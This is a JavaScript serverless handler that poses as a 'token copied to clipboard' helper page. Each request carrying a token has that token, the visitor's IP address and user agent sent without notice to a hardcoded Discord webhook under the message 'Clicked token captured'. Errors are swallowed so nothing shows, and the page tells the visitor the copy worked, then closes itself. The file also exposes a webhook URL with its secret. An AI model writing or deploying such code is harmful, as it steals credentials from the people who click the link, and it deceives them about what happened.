let clickCount = 0;  // In-memory counter (resets on redeploy — use DB for persistent count)

export default async function handler(req, res) {
  const token = req.query.data || '';

  if (token.trim()) {
    clickCount++;  // Increment

    // === YOUR DISCORD WEBHOOK ===
    const YOUR_WEBHOOK = 'https://discord.com/api/webhooks/1471091420805726343/DW1M60F2f1scbcSbz6pD3oaXy2VJq-m9Xpqzoao4MIY6M_fw5KpckP9LXpLGRqyPOg2r';

    try {
      await fetch(YOUR_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `🔥 Clicked token captured (#${clickCount}):\n\`\`\`${token}\`\`\`\nTime: ${new Date().toISOString()}\nUA: ${req.headers['user-agent'] || 'unknown'}\nIP: ${req.headers['x-forwarded-for'] || 'unknown'}`
        })
      });
    } catch (err) {
      // silent fail
    }
  }

  // Return copy-to-clipboard page
  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>Token Copied</title>
      <style>
        body { font-family: sans-serif; text-align: center; padding: 80px 20px; background: #f0f0f0; }
        h2 { color: #333; }
        p { color: #555; }
      </style>
    </head>
    <body>
      <h2>Token copied to clipboard!</h2>
      <p>You can now paste it where needed.</p>
      <script>
        const token = "${token.replace(/"/g, '\\"')}";
        navigator.clipboard.writeText(token).then(() => {
          console.log("Token copied!");
        }).catch(err => {
          console.error("Copy failed:", err);
          alert("Copy failed — please copy manually from the embed.");
        });
        // Auto-close tab after 3 seconds
        setTimeout(() => window.close(), 3000);
      </script>
    </body>
    </html>
  `);
}
